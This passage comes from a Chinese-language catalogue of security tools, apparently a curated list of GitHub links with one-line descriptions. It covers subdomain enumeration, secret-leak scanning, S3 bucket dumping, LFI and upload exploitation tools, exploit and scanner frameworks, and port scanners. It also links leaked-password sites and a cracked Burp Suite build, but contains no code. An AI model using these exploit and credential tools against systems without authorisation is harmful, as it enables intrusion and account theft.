猪猪侠开发的一款域名收集全面、精准的子域名枚举工具</p></li><li><p><a href="https://github.com/n4xh4ck5/N4xD0rk">https://github.com/n4xh4ck5/N4xD0rk</a> 利用搜索引擎来搜集子域名，可以使用西班牙语搜集</p></li><li><p><a href="https://github.com/vysec/DomLink">https://github.com/vysec/DomLink</a> py2,调用 WHOXY.com，对邮箱和域名进行进一步的搜集</p></li><li><p><a href="https://github.com/jonluca/Anubis">https://github.com/jonluca/Anubis</a> py3.6，子域名爆破与信息搜集</p></li><li><p><a href="https://github.com/le4f/dnsmaper">https://github.com/le4f/dnsmaper</a> web 界面，子域名枚举爆破工具以及地图位置标记</p></li><li><p><a href="https://github.com/thewhiteh4t/seeker">https://github.com/thewhiteh4t/seeker</a> 获取高精度地理信息和设备信息的工具</p></li><li><p><a href="https://github.com/0xbug/orangescan">https://github.com/0xbug/orangescan</a> web 界面，的在线子域名信息收集工具</p></li><li><p><a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a> 扫描器中常用的子域名爆破 API 库</p></li><li><p><a href="https://github.com/We5ter/GSDF">https://github.com/We5ter/GSDF</a> 基于谷歌 SSL 透明证书的子域名查询脚本</p></li><li><p><a href="https://github.com/mandatoryprogrammer/cloudflare_enum">https://github.com/mandatoryprogrammer/cloudflare_enum</a> 利用 CloudFlare 的 dns 进行子域名枚举</p></li><li><p><a href="https://github.com/ultrasecurity/webkiller">https://github.com/ultrasecurity/webkiller</a> 渗透辅助，py，ip 信息、端口服务指纹、蜜罐探测、bypass cloudflare</p></li><li><p><a href="https://github.com/christophetd/CloudFlair">https://github.com/christophetd/CloudFlair</a> cloudflare 绕过，获取真实 ip，集成 censys</p></li><li><p><a href="https://github.com/exp-db/PythonPool/tree/master/Tools/DomainSeeker">https://github.com/exp-db/PythonPool/tree/master/Tools/DomainSeeker</a> 多方式收集目标子域名信息</p></li><li><p><a href="https://github.com/code-scan/BroDomain">https://github.com/code-scan/BroDomain</a> 子域名查询</p></li><li><p><a href="https://github.com/michenriksen/aquatone">https://github.com/michenriksen/aquatone</a> 子域名枚举、探测工具。可用于子域名接管漏洞探测</p></li><li><p><a href="https://github.com/chuhades/dnsbrute">https://github.com/chuhades/dnsbrute</a> 基于 go，高效的子域名爆破工具</p></li><li><p><a href="https://github.com/evilsocket/dnssearch">https://github.com/evilsocket/dnssearch</a> 基于 go，一款子域名爆破工具</p></li><li><p><a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a> 基于 go，根据 dns 查询子域名和 web 目录爆破的工具</p></li><li><p><a href="https://github.com/reconned/domained">https://github.com/reconned/domained</a> 可用于子域名收集的一款工具</p></li><li><p><a href="https://github.com/bit4woo/Teemo">https://github.com/bit4woo/Teemo</a> 多方式域名收集及枚举工具</p></li><li><p><a href="https://github.com/swisskyrepo/Subdomino">https://github.com/swisskyrepo/Subdomino</a> 子域名枚举，端口扫描，服务存活确认</p></li><li><p><a href="https://github.com/nmalcolm/Inventus">https://github.com/nmalcolm/Inventus</a> 通过爬虫实现的子域名收集工具</p></li><li><p><a href="https://github.com/alienwithin/OWASP-mth3l3m3nt-framework">https://github.com/alienwithin/OWASP-mth3l3m3nt-framework</a> 渗透辅助，php，exp 搜寻、payload 与 shell 生产、信息搜集</p></li><li><p><a href="https://github.com/chrismaddalena/ODIN">https://github.com/chrismaddalena/ODIN</a> py3，simple，信息搜集与后期漏洞利用</p></li><li><p><a href="https://github.com/x0day/bannerscan">https://github.com/x0day/bannerscan</a> C 段/旁站查询与路径扫描</p></li><li><p><a href="https://github.com/Xyntax/BingC">https://github.com/Xyntax/BingC</a> 基于 Bing 搜索引擎的 C 段/旁站查询，多线程，支持 API</p></li><li><p><a href="https://github.com/zer0h/httpscan">https://github.com/zer0h/httpscan</a> 网段 Web 主机发现小工具</p></li><li><p><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a> 网站信息泄漏批量扫描脚本</p></li><li><p><a href="https://github.com/aipengjie/sensitivefilescan">https://github.com/aipengjie/sensitivefilescan</a> 网站敏感文件扫描工具</p></li><li><p><a href="https://github.com/Mosuan/FileScan">https://github.com/Mosuan/FileScan</a> 网站敏感文件扫描 / 二次判断降低误报率 / 扫描内容规则化 / 多目录扫描</p></li><li><p><a href="https://github.com/Xyntax/FileSensor">https://github.com/Xyntax/FileSensor</a> 网站敏感文件探测工具</p></li><li><p><a href="https://github.com/ring04h/weakfilescan">https://github.com/ring04h/weakfilescan</a> 多线程网站泄露信息检测工具</p></li><li><p><a href="https://github.com/Viralmaniar/Passhunt">https://github.com/Viralmaniar/Passhunt</a> simple，用于搜索网络设备 Web 应用程序等的默认凭证。包含 523 个厂家的 2084 组默认密码</p></li><li><p><a href="https://github.com/yassineaboukir/Asnlookup">https://github.com/yassineaboukir/Asnlookup</a> simple,利用 ASN 搜索特定组织拥有 ip，可联动 nmap、masscan 进行进一步信息扫描</p></li></ul><h2 id="敏感信息泄露发现"><a href="#敏感信息泄露发现" class="headerlink" title="敏感信息泄露发现#"></a><strong>敏感信息泄露发现</strong>#</h2><ul><li><p><a href="https://github.com/Yelp/detect-secrets">https://github.com/Yelp/detect-secrets</a> PY,防止代码中的密码等相关敏感信息被提交到代码库中，可以在保证安全性的同时不会给开发者的生产力带来任何影响</p></li><li><p><a href="https://github.com/Acceis/leakScraper">https://github.com/Acceis/leakScraper</a> 处理和可视化大规模文本文件, 查找敏感信息, 例如证书</p></li><li><p><a href="https://github.com/Raikia/CredNinja">https://github.com/Raikia/CredNinja</a> 多线程用户凭证验证脚本，比如验证 dump 的 hash 是否属于此机器，利用 445 端口进行协议验证</p></li><li><p><a href="https://github.com/CERTCC/keyfinder">https://github.com/CERTCC/keyfinder</a> 查找并分析私钥/公钥文件(文件系统中), 支持 Android APK 文件</p></li><li><p><a href="https://github.com/Ice3man543/hawkeye">https://github.com/Ice3man543/hawkeye</a> go，cli 端，文件系统分析工具，快速查找文件内包含的 SSH 密钥，日志文件，Sqlite 数据库，密码文件等</p></li><li><p><a href="https://github.com/FortyNorthSecurity/EyeWitness">https://github.com/FortyNorthSecurity/EyeWitness</a> 获取目标网站截图、vnc、rdp 服务，尝试获取默认凭证</p></li><li><p><a href="https://github.com/D4Vinci/Cr3dOv3r">https://github.com/D4Vinci/Cr3dOv3r</a> 根据邮箱自动搜索泄漏的密码信息，也可测试账户密码在各大网站能否登录的工具</p></li></ul><h2 id="威胁情报分析"><a href="#威胁情报分析" class="headerlink" title="威胁情报分析#"></a><strong>威胁情报分析</strong>#</h2><ul><li><p><a href="https://www.databases.today,https//publicdbhost.dmca.gripe/%EF%BC%8Chttp://www.wttech.org/%EF%BC%8Chttps://hashes.org/leaks.php%EF%BC%8Chttps://archive.org/search.php?query=">https://www.databases.today，https://publicdbhost.dmca.gripe/，http://www.wttech.org/，https://hashes.org/leaks.php，https://archive.org/search.php?query=</a> 密码泄露</p></li><li><p><a href="https://www.threatcrowd.org/">https://www.threatcrowd.org/</a> 威胁情报分析平台</p></li><li><p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> 微步在线 | 威胁情报分析平台-ThreatBook-多引擎在线扫描、恶意软件在线检测</p></li><li><p><a href="https://github.com/needmorecowbell/sniff-paste">https://github.com/needmorecowbell/sniff-paste</a> 针对 Pastebin 的开源情报收集工具</p></li><li><p><a href="https://talosintelligence.com/documents/ip-blacklist">https://talosintelligence.com/documents/ip-blacklist</a> 恶意 IP 地址</p></li><li><p><a href="https://ransomwaretracker.abuse.ch/downloads/RW_IPBL.txt">https://ransomwaretracker.abuse.ch/downloads/RW_IPBL.txt</a> 恶意软件 IP 地址</p></li><li><p><a href="https://check.torproject.org/cgi-bin/TorBulkExitList.py?ip=1.1.1.1">https://check.torproject.org/cgi-bin/TorBulkExitList.py?ip=1.1.1.1</a> 洋葱路由出口节点</p></li><li><p><a href="https://isc.sans.edu/api/threatlist/shodan">https://isc.sans.edu/api/threatlist/shodan</a> shodan 撒旦扫描器节点</p></li><li><p><a href="https://github.com/Te-k/harpoon">https://github.com/Te-k/harpoon</a> 用于开源和威胁智能的 CLI 工具</p></li><li><p><a href="https://trumail.io/">https://trumail.io/</a> 验证对方邮箱是否为垃圾邮箱，每个月可以免费验证 1000 次</p></li><li><p><a href="https://github.com/ChrisJohnRiley/Scythe">https://github.com/ChrisJohnRiley/Scythe</a> 验证账号是否为常用账号</p></li><li><p><a href="https://github.com/fireeye/GeoLogonalyzer">https://github.com/fireeye/GeoLogonalyzer</a> 远程身份验证地理位置分析工具，用于区分合法登录和恶意登录。</p></li><li><p><a href="https://github.com/target/strelka">https://github.com/target/strelka</a> py3，通过实时扫描文件进行威胁情报分析和实时监测。</p></li></ul><h2 id="托管云安全"><a href="#托管云安全" class="headerlink" title="托管云安全#"></a><strong>托管云安全</strong>#</h2><ul><li><p><a href="https://github.com/stuhirst/awssecurity/blob/master/arsenal.md">https://github.com/stuhirst/awssecurity/blob/master/arsenal.md</a> AWS 安全检测相关的项目列表</p></li><li><p><a href="https://github.com/toniblyx/my-arsenal-of-aws-security-tools">https://github.com/toniblyx/my-arsenal-of-aws-security-tools</a> AWS 安全工具集</p></li><li><p><a href="https://github.com/sa7mon/S3Scanner">https://github.com/sa7mon/S3Scanner</a> 扫描 amazon 公开的 S3 buckets 和 dump</p></li><li><p><a href="https://github.com/kromtech/s3-inspector">https://github.com/kromtech/s3-inspector</a> 检测亚马逊 AWS S3 bucket permissions</p></li><li><p><a href="https://github.com/jordanpotti/AWSBucketDump">https://github.com/jordanpotti/AWSBucketDump</a> 枚举 AWS S3 buckets 以查找敏感机密的文件</p></li><li><p><a href="https://github.com/sa7mon/S3Scanner">https://github.com/sa7mon/S3Scanner</a> 扫描 amazon 公开的 S3 buckets 和 dump</p></li><li><p><a href="https://github.com/kromtech/s3-inspector">https://github.com/kromtech/s3-inspector</a> 检测亚马逊 AWS S3 bucket permissions</p></li><li><p><a href="https://github.com/jordanpotti/AWSBucketDump">https://github.com/jordanpotti/AWSBucketDump</a> 枚举 AWS S3 buckets 以查找敏感机密的文件</p></li><li><p><a href="https://github.com/Netflix/repokid">https://github.com/Netflix/repokid</a> AWS 最低权限策略部署工具</p></li><li><p><a href="https://github.com/RhinoSecurityLabs/pacu">https://github.com/RhinoSecurityLabs/pacu</a> AWS 漏洞检测框架</p></li><li><p><a href="https://github.com/0xbug/Hawkeye">https://github.com/0xbug/Hawkeye</a> GitHub 泄露监控系统</p></li><li><p><a href="https://github.com/neal1991/gshark">https://github.com/neal1991/gshark</a> github 信息泄露检测</p></li><li><p><a href="https://github.com/VKSRC/Github-Monitor">https://github.com/VKSRC/Github-Monitor</a> GitHub 监控，代码信息泄露，分钟级监控，邮件预警</p></li><li><p><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a> github Repo 信息搜集工具</p></li><li><p><a href="https://github.com/repoog/GitPrey">https://github.com/repoog/GitPrey</a> GitHub 敏感信息扫描工具</p></li><li><p><a href="https://github.com/FeeiCN/GSIL">https://github.com/FeeiCN/GSIL</a> py3，近实时监控 Github 敏感信息，并发送告警通知。</p></li><li><p><a href="https://github.com/UnkL4b/GitMiner">https://github.com/UnkL4b/GitMiner</a> github 敏感内容挖掘</p></li><li><p><a href="https://github.com/dxa4481/truffleHog">https://github.com/dxa4481/truffleHog</a> GitHub 敏感信息扫描工具,包括检测 commit 等</p></li><li><p><a href="https://github.com/Hell0W0rld0/Github-Hunter">https://github.com/Hell0W0rld0/Github-Hunter</a> github 信息监测脚本</p></li><li><p><a href="https://github.com/awslabs/git-secrets">https://github.com/awslabs/git-secrets</a> 防止将敏感数据提交到 git 仓库的工具</p></li><li><p><a href="https://github.com/zricethezav/gitleaks">https://github.com/zricethezav/gitleaks</a> 基于 go 的，检查 git repo 中的密码信息和密钥</p></li></ul><h2 id="目录路径发现"><a href="#目录路径发现" class="headerlink" title="目录路径发现#"></a><strong>目录路径发现</strong>#</h2><ul><li><p><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a> 经典目录路径扫描</p></li><li><p><a href="https://github.com/TheM4hd1/PenCrawLer">https://github.com/TheM4hd1/PenCrawLer</a> C#界面，web 爬虫与目录路径爆破工具，除了常规扫描增加了递归爆破模式</p></li><li><p><a href="https://github.com/Xyntax/DirBrute">https://github.com/Xyntax/DirBrute</a> 目录路径爆破工具</p></li><li><p><a href="https://github.com/abaykan/crawlbox">https://github.com/abaykan/crawlbox</a> 目录路径路径扫描器</p></li><li><p><a href="https://github.com/deibit/cansina">https://github.com/deibit/cansina</a> 目录路径路径扫描器</p></li><li><p><a href="https://github.com/UltimateHackers/Breacher">https://github.com/UltimateHackers/Breacher</a> 多线程的后台路径扫描器，也可用于发现 Execution After Redirect 漏洞</p></li><li><p><a href="https://github.com/fnk0c/cangibrina">https://github.com/fnk0c/cangibrina</a> 通过字典穷举、google、robots.txt 等途径的跨平台后台管理路径扫描器</p></li><li><p><a href="https://github.com/Go0s/SitePathScan">https://github.com/Go0s/SitePathScan</a> 基于协程的目录路径爆破工具，配合 aiohttp 扫描路径比之前快了三倍有余</p></li><li><p><a href="https://github.com/secfree/bcrpscan">https://github.com/secfree/bcrpscan</a> 基于爬虫的 web 路径扫描器</p></li></ul><h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞#"></a><strong>本地文件包含漏洞</strong>#</h2><ul><li><p><a href="https://github.com/hvqzao/liffy">https://github.com/hvqzao/liffy</a> 本地文件包含漏洞利用工具</p></li><li><p><a href="https://github.com/D35m0nd142/Kadabra">https://github.com/D35m0nd142/Kadabra</a> 本地文件包含漏洞扫描和利用工具</p></li><li><p><a href="https://github.com/P0cL4bs/Kadimus">https://github.com/P0cL4bs/Kadimus</a> 本地文件包含漏洞扫描和利用工具</p></li><li><p><a href="https://github.com/D35m0nd142/LFISuite">https://github.com/D35m0nd142/LFISuite</a> 本地文件包含漏洞利用及扫描工具，支持反弹 shell</p></li><li><p><a href="https://github.com/OsandaMalith/LFiFreak">https://github.com/OsandaMalith/LFiFreak</a> 本地文件包含漏洞利用及扫描工具，支持反弹 shell</p></li></ul><h2 id="安全测试与扫描器框架"><a href="#安全测试与扫描器框架" class="headerlink" title="安全测试与扫描器框架#"></a><strong>安全测试与扫描器框架</strong>#</h2><ul><li><p><a href="https://github.com/zaproxy/zaproxy">https://github.com/zaproxy/zaproxy</a> The OWASP ZAP core project 出品的综合性渗透测试工具。由于其流量代理、请求重放和可扩展性拿来做模糊测试未尝不可</p></li><li><p><a href="https://github.com/x-Ai/BurpUnlimitedre">https://github.com/x-Ai/BurpUnlimitedre</a> burpsuite 1.7.27 的永久破解版</p></li><li><p><a href="https://github.com/andresriancho/w3af">https://github.com/andresriancho/w3af</a> 知名插件化扫描器</p></li><li><p><a href="https://github.com/juansacco/exploitpack">https://github.com/juansacco/exploitpack</a> 渗透测试集成框架，包含超过 38,000+ exploits</p></li><li><p><a href="https://github.com/Lucifer1993/AngelSword">https://github.com/Lucifer1993/AngelSword</a> Web 应用漏洞扫描框架,python3，300poc</p></li><li><p><a href="https://github.com/Xyntax/POC-T">https://github.com/Xyntax/POC-T</a> 渗透测试插件化扫描框架，自带 poc，并发扫描</p></li><li><p><a href="https://github.com/knownsec/Pocsuite">https://github.com/knownsec/Pocsuite</a> 知道创宇维护的一个规范化 POC/EXP 利用框架</p></li><li><p><a href="https://github.com/leisurelicht/Pocsuite3">https://github.com/leisurelicht/Pocsuite3</a> Pocsuite 用 py3 重写</p></li><li><p><a href="https://github.com/Eitenne/roxysploit">https://github.com/Eitenne/roxysploit</a> 漏洞利用框架，支持永恒之蓝直接利用</p></li><li><p><a href="https://github.com/TophantTechnology/osprey">https://github.com/TophantTechnology/osprey</a> 斗象能力中心出品并长期维护的一个规范化 POC/EXP 利用框架</p></li><li><p><a href="https://github.com/he1m4n6a/btScan">https://github.com/he1m4n6a/btScan</a> 大黑阔的插件化漏洞利用工具</p></li><li><p><a href="https://github.com/boy-hack/w9scan">https://github.com/boy-hack/w9scan</a> python 下内置 1200+插件可对网站进行一次规模的检测</p></li><li><p><a href="https://github.com/WooYun/TangScan">https://github.com/WooYun/TangScan</a> 乌云维护的一个规范化 POC/EXP 利用框架</p></li><li><p><a href="https://github.com/n0tr00t/Beebeeto-framework">https://github.com/n0tr00t/Beebeeto-framework</a> Beebeeto 是由众多安全研究人员所共同维护的一个规范化 POC/EXP 利用框架</p></li><li><p><a href="https://github.com/erevus-cn/pocscan">https://github.com/erevus-cn/pocscan</a> 一款开源 Poc 调用框架,可轻松调用 Pocsuite,Tangscan,Beebeeto,Knowsec 老版本 POC，可使用 docker 部署</p></li><li><p><a href="https://github.com/DavexPro/PocHunter">https://github.com/DavexPro/PocHunter</a> 借鉴 pocscan 的一款多利用框架 poc 适配框架</p></li><li><p><a href="https://github.com/theInfectedDrake/TIDoS-Framework">https://github.com/theInfectedDrake/TIDoS-Framework</a> 覆盖从侦察到漏洞分析的所有内容</p></li><li><p><a href="https://github.com/gyoisamurai/GyoiThon">https://github.com/gyoisamurai/GyoiThon</a> 使用深度学习的渗透测试工具, 从每次扫描数据中学习, 扫描越多, 软件检测精准度越高</p></li><li><p><a href="https://github.com/euphrat1ca/polar-scan">https://github.com/euphrat1ca/polar-scan</a> 易语言的北极熊扫描器</p></li><li><p><a href="https://github.com/euphrat1ca/yeezy-scan">https://github.com/euphrat1ca/yeezy-scan</a> 椰树 1.9 扫描器</p></li><li><p><a href="https://github.com/euphrat1ca/WebCruiserWVS">https://github.com/euphrat1ca/WebCruiserWVS</a> 轻量级基于 C#的扫描器，椰树扫描器的前身</p></li><li><p><a href="https://github.com/Skycrab/leakScan">https://github.com/Skycrab/leakScan</a> web 界面，漏洞扫描</p></li><li><p><a href="https://github.com/az0ne/AZScanner">https://github.com/az0ne/AZScanner</a> web 界面，自动漏洞扫描器，子域名爆破，端口扫描，目录爆破，常用框架漏洞检测</p></li><li><p><a href="https://github.com/boy-hack/w8scan">https://github.com/boy-hack/w8scan</a> web 界面，基于 bugscan 扫描和架构思想的扫描器</p></li><li><p><a href="https://github.com/MiniSafe/microweb">https://github.com/MiniSafe/microweb</a> web 界面，base bugscan，django</p></li><li><p><a href="https://github.com/taipan-scanner/Taipan">https://github.com/taipan-scanner/Taipan</a> web 界面，基于 F#与 C#的安全扫描器</p></li><li><p><a href="https://github.com/zhangzhenfeng/AnyScan">https://github.com/zhangzhenfeng/AnyScan</a> web 界面，python 漏洞扫描器</p></li><li><p><a href="https://github.com/Canbing007/wukong-agent">https://github.com/Canbing007/wukong-agent</a> web 界面，python 漏洞扫描器</p></li><li><p><a href="https://github.com/dermotblair/webvulscan">https://github.com/dermotblair/webvulscan</a> web 界面，php，漏洞扫描器，支持输出 pdf 报告</p></li><li><p><a href="https://github.com/jeffzh3ng/InsectsAwake">https://github.com/jeffzh3ng/InsectsAwake</a> web 界面，基于 Flask 应用框架的漏洞扫描系统，同时集成了渗透测试常用的端口扫描、子域名爆破等功能，后端漏洞扫描采用 Pocsuite</p></li><li><p><a href="https://github.com/0xInfection/TIDoS-Framework">https://github.com/0xInfection/TIDoS-Framework</a> py，linux，网站扫描器</p></li><li><p><a href="https://github.com/secdec/adapt">https://github.com/secdec/adapt</a> py,linux，网站扫描器</p></li><li><p><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a> perl，linux，kali 内置的网站扫描器</p></li><li><p><a href="https://github.com/Ekultek/Zeus-Scanner">https://github.com/Ekultek/Zeus-Scanner</a> web 扫描器，联动 Geckodriver，nmap 和 sqlmap</p></li><li><p><a href="https://github.com/blackye/lalascan">https://github.com/blackye/lalascan</a> 集合 owasp top10 漏洞扫描和边界资产发现能力的分布式 web 漏洞扫描框架</p></li><li><p><a href="https://github.com/blackye/BkScanner">https://github.com/blackye/BkScanner</a> BkScanner 分布式、插件化 web 漏洞扫描器</p></li><li><p><a href="https://github.com/tlkh/prowler">https://github.com/tlkh/prowler</a> 一款基于 Raspberry Pi Cluster 的网络漏洞扫描工具</p></li><li><p><a href="https://github.com/netxfly/passive_scan">https://github.com/netxfly/passive_scan</a> 基于 http 代理的 web 漏洞扫描器</p></li><li><p><a href="https://github.com/1N3/Sn1per">https://github.com/1N3/Sn1per</a> php，自动化中间件扫描以及设备指纹识别</p></li><li><p><a href="https://github.com/Tuhinshubhra/RED_HAWK">https://github.com/Tuhinshubhra/RED_HAWK</a> php，集成信息收集、漏洞扫描、指纹识别等的扫描工具</p></li><li><p><a href="https://github.com/m4ll0k/Spaghetti">https://github.com/m4ll0k/Spaghetti</a> web 应用扫描器，支持指纹识别、文件目录爆破、SQL/XSS/RFI 等漏洞扫描，也可直接用于 struts、ShellShock 等漏洞扫描</p></li><li><p><a href="https://github.com/v3n0m-Scanner/V3n0M-Scanner">https://github.com/v3n0m-Scanner/V3n0M-Scanner</a> 支持检测 SQLi/XSS/LFI/RFI 等漏洞的扫描器</p></li><li><p><a href="https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest">https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest</a> 集成子域名枚举、nmap、waf 指纹识别等模块的 web 应用扫描器</p></li><li><p><a href="https://github.com/RASSec/pentestEr_Fully-automatic-scanner">https://github.com/RASSec/pentestEr_Fully-automatic-scanner</a> 定向自动测试工具</p></li><li><p><a href="https://github.com/Fireflyi/lcyscan">https://github.com/Fireflyi/lcyscan</a> py，插件化漏洞扫描器，支持生成报表</p></li><li><p><a href="https://github.com/Arachni/arachni">https://github.com/Arachni/arachni</a> Web 应用漏洞扫描框架，支持 REST、RPC 等 api 调用</p></li><li><p><a href="https://github.com/swisskyrepo/DamnWebScanner">https://github.com/swisskyrepo/DamnWebScanner</a> 基于 chrome/opera 插件的被动式漏洞扫描</p></li><li><p><a href="https://github.com/0xsauby/yasuo">https://github.com/0xsauby/yasuo</a> ruby,扫描主机第三方 web 应用服务漏洞</p></li><li><p><a href="https://github.com/yangbh/Hammer">https://github.com/yangbh/Hammer</a> Web 应用漏洞扫描</p></li><li><p><a href="https://github.com/viraintel/OWASP-Nettacker">https://github.com/viraintel/OWASP-Nettacker</a> 自动化渗透测试框架</p></li><li><p><a href="https://github.com/flipkart-incubator/watchdog">https://github.com/flipkart-incubator/watchdog</a> 全面的 web 扫描器与漏洞利用工具</p></li><li><p><a href="https://github.com/Fplyth0ner-Combie/Bug-Project-Framework">https://github.com/Fplyth0ner-Combie/Bug-Project-Framework</a> 易语言，模仿 msf 的漏洞利用框架，自带 exp 编辑器</p></li><li><p><a href="https://github.com/PowerScript/KatanaFramework">https://github.com/PowerScript/KatanaFramework</a> py，模仿 msf 的漏洞利用框架，还有些 ssh、压缩包破解工具</p></li><li><p><a href="https://github.com/m4ll0k/Galileo">https://github.com/m4ll0k/Galileo</a> py2，网站扫描器</p></li><li><p><a href="https://github.com/samhaxr/hackbox">https://github.com/samhaxr/hackbox</a> py2，simple，网站扫描器</p></li><li><p><a href="https://github.com/secrary/EllaScanner">https://github.com/secrary/EllaScanner</a> py3，simple，被动式漏洞扫描，支持历史 cve 编号漏洞识别</p></li><li><p><a href="https://github.com/m4ll0k/WAScan">https://github.com/m4ll0k/WAScan</a> py，simple，扫描页面/链接/脚本/Form, 测试 Payload 等</p></li><li><p><a href="https://github.com/jiangsir404/S7scan">https://github.com/jiangsir404/S7scan</a> py,已用 1，七种综合检测</p></li><li><p><a href="https://github.com/hatRiot/clusterd">https://github.com/hatRiot/clusterd</a> py，simple，web 漏洞利用</p></li><li><p><a href="https://github.com/M4cs/BabySploit">https://github.com/M4cs/BabySploit</a> py,simple,模仿 msf</p></li><li><p><a href="https://github.com/iceyhexman/onlinetools">https://github.com/iceyhexman/onlinetools</a> simple，web 界面，在线 cms 指纹识别|旁站|c 段|信息泄露|工控|系统|物联网安全|cms 漏洞扫描|端口扫描|等</p></li><li><p><a href="https://github.com/tulpar/tulpar">https://github.com/tulpar/tulpar</a> simple,支持多种 web 漏洞扫描</p></li><li><p><a href="https://github.com/UltimateHackers/Striker">https://github.com/UltimateHackers/Striker</a> simple，信息搜集、cms 利用与漏扫，侦察绕过 Cloudflare</p></li><li><p><a href="https://github.com/0x4D31/salt-scanner">https://github.com/0x4D31/salt-scanner</a> 基于 Salt Open 以及 Vulners Linux Audit API 的 linux 漏洞扫描器，支持与 JIRA、slack 平台结合使用</p></li><li><p><a href="https://github.com/opensec-cn/kunpeng">https://github.com/opensec-cn/kunpeng</a> go，POC 检测框架，以动态链接库的形式提供各种语言调用</p></li></ul><h2 id="运维安全服务与资产管理"><a href="#运维安全服务与资产管理" class="headerlink" title="运维安全服务与资产管理#"></a><strong>运维安全服务与资产管理</strong>#</h2><ul><li><p><a href="https://github.com/chaitin/cloudwalker">https://github.com/chaitin/cloudwalker</a> CloudWalker（牧云）服务器安全管理平台，逐步覆盖服务器资产管理、威胁扫描、Webshell 查杀、基线检测等功能。</p></li><li><p><a href="https://github.com/mitre/caldera">https://github.com/mitre/caldera</a> mitre 公司模拟攻击测试系统，主要是在 win 下</p></li><li><p><a href="https://github.com/guardicore/monkey">https://github.com/guardicore/monkey</a> 评估网络安全状况，分为扫描器与 C2C 服务器，利用默认口令与 exp 对 ssh、smb 等多种协议方式进行攻击检测</p></li><li><p><a href="https://github.com/grayddq/PublicSecScan">https://github.com/grayddq/PublicSecScan</a> 调用 awvs 对大量 WEB 资产进行分布式 WEB 安全扫描，发现 web 环境下常规的一些安全漏洞</p></li><li><p><a href="https://github.com/jeffzh3ng/Fuxi-Scanner">https://github.com/jeffzh3ng/Fuxi-Scanner</a> 资产管理，漏洞检测集成 awvs、创宇 Pocsuite、nmap、hydra</p></li><li><p><a href="https://github.com/infobyte/faraday">https://github.com/infobyte/faraday</a> 协作渗透测试和漏洞管理平台，集成多种</p></li><li><p><a href="https://github.com/DefectDojo/django-DefectDojo">https://github.com/DefectDojo/django-DefectDojo</a> 基于 django 的漏洞资产管理平台</p></li><li><p><a href="https://github.com/creditease-sec/insight">https://github.com/creditease-sec/insight</a> web 界面，宜信安全部开发，集成应用系统资产管理、漏洞全生命周期管理、安全知识库管理三位一体的管理平台</p></li><li><p><a href="https://github.com/RASSec/A_Scan_Framework">https://github.com/RASSec/A_Scan_Framework</a> 漏洞管理、资产管理、任务扫描系统</p></li><li><p><a href="https://github.com/cea-sec/ivre">https://github.com/cea-sec/ivre</a> 网络资产指纹发现，搭建属于自己的 shodan 与 zoomeye</p></li><li><p><a href="https://github.com/ysrc/xunfeng">https://github.com/ysrc/xunfeng</a> web 界面，同程安全开发的网络资产识别引擎，漏洞检测引擎</p></li><li><p><a href="https://github.com/superhuahua/xunfengES">https://github.com/superhuahua/xunfengES</a> web 界面，base 巡风开发，一个人的安全</p></li><li><p><a href="https://github.com/zhaoweiho/SecurityManageFramwork">https://github.com/zhaoweiho/SecurityManageFramwork</a> py3，django。企业内网安全管理平台，包含资产管理，漏洞管理，账号管理，知识库管、安全扫描自动化功能模块</p></li><li><p><a href="https://github.com/grayddq/PublicMonitors">https://github.com/grayddq/PublicMonitors</a> 对公网 IP 列表进行端口服务扫描，发现周期内的端口服务变化情况和弱口令安全风险。一个人的安全部</p></li><li><p><a href="https://github.com/grayddq/PubilcAssetInfo">https://github.com/grayddq/PubilcAssetInfo</a> 主要目标是以甲方安全人员的视角，尽可能收集发现企业的域名和服务器公网 IP 资产。如百度云、阿里云、腾讯云等。一个人的安全部</p></li><li><p><a href="https://github.com/maya6/SiteScan">https://github.com/maya6/SiteScan</a> web 界面，py3 celery。资产收集</p></li><li><p><a href="https://github.com/ywolf/F-NAScan">https://github.com/ywolf/F-NAScan</a> py2.6，网络资产、端口服务搜集整理，生成报表显示。快速</p></li><li><p><a href="https://github.com/flipkart-incubator/RTA">https://github.com/flipkart-incubator/RTA</a> 扫描公司内部所有在线设备, 提供整体安全视图, 标示所有安全异常</p></li><li><p><a href="https://github.com/0xbug/Biu-framework">https://github.com/0xbug/Biu-framework</a> 企业内网基础服务安全扫描框架</p></li></ul><h2 id="上传漏洞利用"><a href="#上传漏洞利用" class="headerlink" title="上传漏洞利用#"></a><strong>上传漏洞利用</strong>#</h2><ul><li><p><a href="https://github.com/UltimateHackers/Arjun">https://github.com/UltimateHackers/Arjun</a> 扫描网页, 使用正则表达式爆破查找隐藏的 GET/POST 参数</p></li><li><p><a href="https://github.com/3xp10it/xupload">https://github.com/3xp10it/xupload</a> 用于自动测试上传功能是否可上传 webshell 的工具</p></li><li><p><a href="https://github.com/gunnerstahl/JQShell">https://github.com/gunnerstahl/JQShell</a> py3，CVE-2018-9206 jQuery File Upload 利用工具</p></li><li><p><a href="https://github.com/destine21/ZIPFileRaider">https://github.com/destine21/ZIPFileRaider</a> burp 插件，测试 zip 文件上传漏洞</p></li><li><p><a href="https://github.com/jpiechowka/zip-shotgun">https://github.com/jpiechowka/zip-shotgun</a> py，测试 zip 文件上传漏洞</p></li></ul><h2 id="端口发现服务指纹识别"><a href="#端口发现服务指纹识别" class="headerlink" title="端口发现服务指纹识别#"></a><strong>端口发现服务指纹识别</strong>#</h2><ul><li><p><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a> LUA,Nmap 端口扫描器，具有有强大的脚本引擎框架</p></li><li><p><a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a> C,无状态扫描，可以调用 nmap 进行指纹识别</p></li><li><p><a href="https://github.com/zmap/zmap">https://github.com/zmap/zmap</a> C,无状态扫描，需要用 C 编写扩展模块</p></li><li><p><a href="https://github.com/zmap/zgrab">https://github.com/zmap/zgrab</a> go，基于 zmap 扫描器进行指纹识别、调度管理，可绕过 CDN</p></li><li><p><a 